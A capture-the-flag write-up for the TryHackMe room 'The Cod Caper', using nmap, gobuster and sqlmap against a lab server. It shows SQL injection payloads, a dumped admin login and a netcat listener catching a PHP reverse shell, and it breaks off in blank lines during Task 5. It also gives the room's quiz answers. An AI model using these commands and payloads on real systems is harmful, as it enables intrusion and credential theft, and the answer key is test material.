# The Cod Caper

![alt text](https://github.com/kashyap-source/Try-Hack-Me/blob/master/Linux/The%20Cod%20Caper/Image/gq8tre5.png)

**Source:** Created by Paradox

***Description:***
  A guided room taking you through infiltrating and exploiting a Linux system.
  
***Related Hosting Links***

- *TryHackMe.com*
  - Link: https://tryhackme.com/room/rptmux  

**Task 1:**

***Instruction:***
-Hello there my name is Pingu. I've come here to put in a request to get my fish back! My dad recently banned me from eating fish, as I wasn't eating my vegetables. He locked all the fish in a chest, and hid the key on my old pc, that he recently repurposed into a server. As all penguins are natural experts in penetration testing, I figured I could get the key myself! Unfortunately he banned every IP from Antarctica, so I am unable to do anything to the server. Therefore I call upon you my dear ally to help me get my fish back! Naturally I'll be guiding you through the process.

-Note: This room expects some basic pen testing knowledge, as I will not be going over every tool in detail that is used. While you can just use the room to follow through, some interest or experiencing in assembly is highly recommended

**Task 2 Host Enumeration)**

-Recommended Tool - nmap:

**Nmap**
     -kali@kali:~$ nmap -vv -sC -sV 10.10.85.135
     
     Scanning 10.10.85.135 [1000 ports]
     Discovered open port 80/tcp on 10.10.85.135
     Discovered open port 22/tcp on 10.10.85.135

     PORT   STATE SERVICE REASON  VERSION
     22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
     | ssh-hostkey: 
     |   2048 6d:2c:40:1b:6c:15:7c:fc:bf:9b:55:22:61:2a:56:fc (RSA)
     | ssh-rsa                                  
     AAAAB3NzaC1yc2EAAAADAQABAAABAQDs2k31WKwi9eUwlvpMuWNMzFjChpDu4IcM3k6VLyq3IEnYuZl2lL/
     dMWVGCKPfnJ1yv2IZVk1KXha7nSIR4yxExRDx7Ybi7ryLUP/XTrLtBwdtJZB7k48EuS8okvYLk4ppG1MRvrV
     ojNPprF4nh5S0EEOowqGoiHUnGWOzYSgvaLAgvr7ivZxSsFCLqvdmieErVrczCBOqDOcPH9ZD/q6WalyHM
     ccZWVL3Gk5NmHPaYDd9ozVHCMHLq7brYxKrUcoOtDhX7btNamf+PxdH5I9opt6aLCjTTLsBPO2v5qZYPm1Rod6
     4nysurgnEKe+e4ZNbsCvTc1AaYKVC+oguSNmT
     |   256 ff:89:32:98:f4:77:9c:09:39:f5:af:4a:4f:08:d6:f5 (ECDSA)
     | ecdsa-sha2-nistp256 
     AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAmpmAEGyFxyUqlKmlCnCeQW4KX
     OpnSG6SwmjD5tGSoYaz5Fh1SFMNP0/KNZUStQK9KJmz1vLeKI03nLjIR1sho=
     |   256 89:92:63:e7:1d:2b:3a:af:6c:f9:39:56:5b:55:7e:f9 (ED25519)
     |_ssh-ed25519 
     AAAAC3NzaC1lZDI1NTE5AAAAIFBIRpiANvrp1KboZ6vAeOeYL68yOjT0wbxgiavv10kC
     80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
     | http-methods: 
     |_  Supported Methods: POST OPTIONS GET HEAD
     |_http-server-header: Apache/2.4.18 (Ubuntu)
     |_http-title: Apache2 Ubuntu Default Page: It works
     Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
     
1) How many ports are open on the target machine?
  
    **2**

2) What is the http-title of the web server?

    **Apache2 Ubuntu Default Page: It works**

3) What version is the ssh service?

    **OpenSSH 7.2p2 Ubuntu 4ubuntu2.8**

4) What is the version of the web server?
  
   **Apache/2.4.18**
   
**Task 3 (Web Enumeration)**
    
 **Gobuster:**
         
         kali@kali:~/Documents$ gobuster dir -u http://10.10.85.135 -w big.txt -x php,txt,html
         ===============================================================
         Gobuster v3.0.1
         by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
         ===============================================================
         [+] Url:            http://10.10.85.135
         [+] Threads:        10
         [+] Wordlist:       big.txt
         [+] Status codes:   200,204,301,302,307,401,403
         [+] User Agent:     gobuster/3.0.1
         [+] Extensions:     txt,html,php
         [+] Timeout:        10s
         ===============================================================
         2020/11/07 01:33:25 Starting gobuster
         ===============================================================
          /.htaccess (Status: 403)
          /.htaccess.php (Status: 403)
          /.htaccess.txt (Status: 403)
          /.htaccess.html (Status: 403)
          /.htpasswd (Status: 403)
          /.htpasswd.txt (Status: 403)
          /.htpasswd.html (Status: 403)
          /.htpasswd.php (Status: 403)
          /administrator.php (Status: 200)
          Progress: 1983 / 20474 (9.69%)^C
          [!] Keyboard interrupt detected, terminating.
          ===============================================================
          2020/11/07 01:36:20 Finished
          ===============================================================
          
1) What is the name of the important file on the server?

     **administrator.php**
     
**Task 4 (Web Exploitation)**

**sqlmap**
       
       kali@kali:~$ sqlmap -v -u 
       http://10.10.85.135/administrator.php  --data 'username=&password=' -users -T --dump
             ___
            __H__                                                                                           ___ ___[.]_____ ___ ___  {1.4.10#stable}                                                            |_ -| . [)]     | .'| . |                                                                            |___|_  [,]_|_|_|__,|  _|                                                                                  |_|V...       |_|   http://sqlmap.org  
     [!] legal disclaimer: Usage of sqlmap for attacking targets  without prior mutual consent is          illegal. It is the end user's responsibility to obey all applicable local, state and federal          laws. Developers assume no liability and are not responsible for any misuse or damage caused by      this program
     
     [*] starting @ 02:21:31 /2020-11-07/
     
     [02:21:32] [WARNING] provided value for parameter 'username' is empty. Please, always use only        valid parameter values so sqlmap could be able to run properly
     [02:21:32] [WARNING] provided value for parameter 'password' is empty. Please, always use only        valid parameter values so sqlmap could be able to run properly
     [02:21:32] [INFO] resuming back-end DBMS 'mysql' 
     [02:21:32] [INFO] testing connection to the target URL
     sqlmap resumed the following injection point(s) from stored session:
     ---
     Parameter: username (POST)
    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: username=' AND GTID_SUBSET(CONCAT(0x716b6b6a71,(SELECT                            (ELT(3138=3138,1))),0x7170707a71),3138)-- LQrA&password=

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=' AND (SELECT 9447 FROM (SELECT(SLEEP(5)))Kdxo)-- zzqO&password=
    ---
    [02:21:32] [INFO] the back-end DBMS is MySQL
    back-end DBMS: MySQL >= 5.6
    [02:21:32] [INFO] fetching columns for table 'users' in database 'users'
    [02:21:34] [INFO] retrieved: 'username'
    [02:21:35] [INFO] retrieved: 'varchar(100)'
    [02:21:35] [INFO] retrieved: 'password'
    [02:21:35] [INFO] retrieved: 'varchar(100)'
    [02:21:35] [INFO] fetching entries for table 'users' in database 'users'
    [02:21:35] [INFO] retrieved: 'secretpass'
    [02:21:36] [INFO] retrieved: 'pingudad'
    Database: users
    Table: users
    [1 entry]
    +------------+----------+
    | password   | username |
    +------------+----------+
    | secretpass | pingudad |
    +------------+----------+
    [02:21:36] [INFO] table 'users.users' dumped to CSV file '/home/kali/.loc
    [02:21:36] [INFO] fetched data logged to text files under '/home/kali/.lo

    [*] ending @ 02:21:36 /2020-11-07/

1)  What is the admin username?

      **pingudad**

2)  What is the admin password?

      **secretpass**
     
3) How many forms of SQLI is the form vulnerable to?

     **3**
     
**Task 5 (Command Execution)**

**PHP reverse shell & netcat** 
               
            kali@kali:~$ sudo nc -lnvp 80
            Listening on 0.0.0.0 80
Connection received on 10.10.210.94 40862
/bin/sh: 0: can't access tty; job control turned off
$ ls
2591c98b70119fe624898b1e424b5e91.php
administrator.php
index.html
                
                
                
                
                
                
                
                
                
                
                
                
                
                
                
                
                
                
                
                
                
     
       
